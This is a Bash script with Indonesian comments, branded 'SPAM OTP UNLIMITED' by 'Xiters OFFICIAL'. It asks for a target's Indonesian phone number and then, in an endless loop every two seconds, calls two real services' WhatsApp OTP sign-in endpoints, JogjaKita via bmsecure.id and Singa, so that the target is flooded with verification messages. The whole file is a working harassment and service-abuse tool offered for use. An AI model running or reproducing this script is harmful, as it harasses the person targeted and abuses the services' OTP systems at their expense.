#!/bin/bash

# ANSI Color Codes
RED='\033[1;91m'
GREEN='\033[1;92m'
YELLOW='\033[1;93m'
CYAN='\033[1;96m'
WHITE='\033[1;97m'
NC='\033[0m'

# Menampilkan teks berwarna
color() {
  case "$1" in
    red)    printf "${RED}%s${NC}\n" "$2" ;;
    green)  printf "${GREEN}%s${NC}\n" "$2" ;;
    yellow) printf "${YELLOW}%s${NC}\n" "$2" ;;
    cyan)   printf "${CYAN}%s${NC}\n" "$2" ;;
    white)  printf "${WHITE}%s${NC}\n" "$2" ;;
    *)      printf "%s${NC}\n" "$2" ;;
  esac
}

# Ambil nilai dari JSON response
fetch_value() {
  local response=$1
  local start_string=$2
  local end_string=$3

  local start_index=$(expr index "$response" "$start_string")
  if [ "$start_index" -eq 0 ]; then return; fi

  start_index=$((start_index + ${#start_string}))
  local remaining_string="${response:$start_index}"
  local end_index=$(expr index "$remaining_string" "$end_string")
  if [ "$end_index" -eq 0 ]; then return; fi

  end_index=$((end_index - 1))
  printf "%s\n" "${remaining_string:0:$end_index}"
}

# Fungsi spam API dari JogjaKita
jogjakita() {
  local nomor=$1
  local url="https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send"
  local payload="{\"mobile_phone\": \"$nomor\", \"type\": \"mobile\", \"is_switchable\": 1}"
  local headers=("Content-Type: application/json; charset=utf-8")

  local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" "$url")
  local result=$(fetch_value "$response" '"msg":"' '","')

  if [ "$result" == "Success" ]; then
    color red "JOGJAKITA: Spam Whatsapp ke $nomor"
    return 0
  else
    color yellow "JOGJAKITA: $response"
    return 1
  fi
}

# Fungsi spam API dari Singa
singa() {
  local nomor=$1
  local url="https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id="
  local payload="{\"mobile_phone\": \"$nomor\", \"type\": \"mobile\", \"is_switchable\": 1}"
  local headers=("Content-Type: application/json; charset=utf-8")

  local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" "$url")
  local result=$(fetch_value "$response" '"msg":"' '","')

  if [ "$result" == "Success" ]; then
    color red "SINGA: Spam Whatsapp ke $nomor"
    return 0
  else
    color yellow "SINGA: $response"
    return 1
  fi
}

# Fungsi utama untuk mengirim spam WA
spam_whatsapp() {
  local nomor=$1
  if [ -z "$nomor" ]; then
    echo "Penggunaan: spam_whatsapp <nomor_telepon>"
    return 1
  fi

  jogjakita "$nomor"
  singa "$nomor"
}

# ===========================
# Tampilan Awal
# ===========================
clear
figlet CITERGR TOLS
echo -e "${RED}   ──────────────────────────────────────────────────${NC}"
echo -e "${WHITE}   ──────────────────────────────────────────────────${NC}"
echo -e "${RED}
      ╭────────────────────────────────────────╮
      │           ${CYAN}SPAM OTP UNLIMITED${RED}           │
      ╰────────────────────────────────────────╯
    ${NC}"
echo -e "${RED}
      ╭────────────────────────────────────────╮
      │           ${GREEN}XITERS OFFICIAL ?${RED}            │
      ╰────────────────────────────────────────╯
    ${NC}"


# ===========================
# Loop Utama
# ===========================
while true; do
  color white "DEVELOPER: Xiters OFFICIAL✓"
  read -p "MASUKAN NOMOR TARGET (62XX): " nomor

  if [[ ! "$nomor" =~ ^62[0-9]+$ ]]; then
    color yellow "Nomor harus dimulai dengan 62 dan hanya berisi angka."
    continue
  fi

  while true; do
    spam_whatsapp "$nomor"
    sleep 2
  done
done
